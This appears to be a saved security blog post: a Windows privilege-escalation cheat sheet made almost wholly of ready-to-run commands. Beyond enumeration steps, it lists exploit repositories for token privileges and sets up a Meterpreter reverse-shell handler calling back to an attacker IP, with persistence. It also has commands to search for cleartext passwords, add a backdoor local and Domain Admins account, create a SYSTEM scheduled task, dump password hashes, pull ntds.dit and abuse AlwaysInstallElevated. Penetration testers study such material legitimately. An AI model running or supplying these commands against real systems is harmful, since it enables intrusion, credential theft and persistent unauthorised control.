---
created: 2025-10-30T10:39:48 (UTC +01:00)
tags: []
source: https://sirensecurity.io/blog/windows-privilege-escalation-resources/
author: 
---

# Windows Privilege Escalation –

> ## Excerpt
> 

---
![](https://sirensecurity.io/blog/wp-content/uploads/2021/04/9.jpg)

Windows Privilege Escalation

S1REN

Going up.

**TL;DR**

+-------------------------------+

| INITIAL ENUMERATION |

+-------------------------------+

**DOMAIN ENUM (if joined)**

BloodHound / SharpHound

**WHOAMI?**

whoami

```
echo %username%
```

**PRIVILEGES?**

whoami /priv

**SYSTEM INFO**

systeminfo

wmic os get Caption,CSDVersion,OSArchitecture,Version

**SERVICES**

wmic service get name,startname

net start

**ADMIN CHECK**

net localgroup administrators

net user

**NETWORK**

netstat -anoy

route print

arp -A

ipconfig /all

**USERS**

net users

net user

net localgroup

**FIREWALL**

netsh advfirewall firewall show rule name=all

**SCHEDULED TASKS**

schtasks /query /fo LIST /v > schtasks.txt

INSTALLATION RIGHTS

reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

```
+-----------------------------------------------------------------------+
|     WINDOWS PRIV ESC: GITHUB EXPLOITS                                 |
+-----------------------------------------------------------------------+
| Privilege Name              | GitHub PoC                              |
|---------------------------- |-----------------------------------------|
| SeDebugPrivilege            | github.com/bruno-1337/SeDebugPrivilege- |
| SeImpersonatePrivilege      | github.com/itm4n/PrintSpoofer           |
| SeAssignPrimaryToken        | github.com/b4rdia/HackTricks            |
| SeTcbPrivilege              | github.com/hatRiot/token-priv           |
| SeCreateTokenPrivilege      | github.com/hatRiot/token-priv           |
| SeLoadDriverPrivilege       | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege    | github.com/hatRiot/token-priv           |
| SeRestorePrivilege          | github.com/xct/SeRestoreAbuse           |
| SeBackupPrivilege           | github.com/k4sth4/SeBackupPrivilege     |
| SeIncreaseQuotaPrivilege    | github.com/b4rdia/HackTricks            |
| SeSystemEnvironment         | github.com/b4rdia/HackTricks            |
| SeMachineAccount            | github.com/b4rdia/HackTricks            |
| SeTrustedCredManAccess      | learn.microsoft.com/...trusted-caller   |
| SeRelabelPrivilege          | github.com/decoder-it/RelabelAbuse      |
| SeManageVolumePrivilege     | github.com/CsEnox/SeManageVolumeExploit |
| SeCreateGlobalPrivilege     | github.com/b4rdia/HackTricks            |
+-----------------------------------------------------------------------+

Notes:
- PrintSpoofer is gold for SeImpersonatePrivilege.
- SeManageVolume has practical field PoCs.
```

```
+----------------------------+
|     MAINTAINING ACCESS     |
+----------------------------+
> METERPRETER REVERSE SHELL SETUP
  msfconsole
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  exploit

> PERSISTENCE
  meterpreter > run persistence -U -i 5 -p 443 -r <LHOST>

> PORT FORWARDING
  meterpreter > portfwd add -l 3306 -p 3306 -r <target_ip>

> SYSTEM MIGRATION
  meterpreter > run post/windows/manage/migrate
  meterpreter > migrate <PID>

> EXECUTE PAYLOADS
  powershell.exe "C:\Tools\privesc.ps1"

+-------------------------------+
|        PRIVES EC CHECKLIST    |
+-------------------------------+
> UNQUOTED SERVICE PATHS
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows" | findstr /v '"'

> WEAK SERVICE PERMISSIONS
  accesschk.exe -uwcqv <service>
  sc qc <service>
  icacls "C:\Path\To\Service.exe"

> FILE TRANSFER OPTIONS
  certutil.exe
  powershell (IEX)
  SMB / FTP / TFTP / VBScript

> CLEAR TEXT CREDENTIALS
  findstr /si password *.txt *.xml *.ini
  dir /s *pass* == *cred* == *.config*

> WEAK FILE PERMISSIONS
  accesschk.exe -uwqs Users c:\*.*
  accesschk.exe -uwqs "Authenticated Users" c:\*.*

> NEW ADMIN USER (Local/Domain)
  net user siren P@ssw0rd! /add
  net localgroup administrators siren /add
  net group "Domain Admins" siren /add /domain

+--------------------------------+
|     SCHEDULED TASK ABUSE       |
+--------------------------------+
> ENUM
  schtasks /query /fo LIST /v > tasks.txt

> CREATE SYSTEM TASK
  schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr "C:\Tools\sirenMaint.exe"

> RUN TASK
  schtasks /run /tn "RUNME"

+-------------------------------+
|    POST EXPLOIT ENUMERATION   |
+-------------------------------+
> NETWORK USERS
  net user
  net user <target>
  net localgroup administrators

> NT AUTHORITY CHECKS
  whoami
  accesschk.exe /accepteula
  MS09-012.exe "whoami"

> HASH DUMP
  meterpreter > hashdump

> EXFILTRATE ntds.dit
  Use secretsdump.py or disk capture tools

> INSTALLER ABUSE
  AlwaysInstallElevated = 1
  msiexec /i evil.msi

> SHARE ENUMERATION
  net share
  net use
  net use Z: \\TARGET\SHARE /persistent:yes

+----------------------------+
|   TOOLKIT / RESOURCES      |
+----------------------------+
> Windows Exploit Suggester
  https://github.com/AonCyberLabs/Windows-Exploit-Suggester

> Cross Compile Payloads (Linux > Windows)
  apt-get install mingw-w64
  x86: i686-w64-mingw32-gcc hello.c -o hello.exe
  x64: x86_64-w64-mingw32-gcc hello.c -o hello64.exe

> Additional Reading
  https://www.fuzzysecurity.com/tutorials/16.html
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
```
